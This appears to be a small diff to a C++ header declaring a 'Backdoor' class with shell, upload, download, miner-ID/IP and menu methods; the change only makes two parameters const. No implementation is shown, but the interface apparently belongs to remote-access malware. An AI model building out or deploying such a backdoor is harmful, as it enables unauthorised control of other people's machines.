@@ -6,8 +6,8 @@
 class Backdoor{
 public:
     void shell();
-    void upload(char *);
-    void download(char *);
+    void upload(const char *);
+    void download(const char *);
     std::string get_miner_id();
     std::string get_miner_ip();
     void menu();
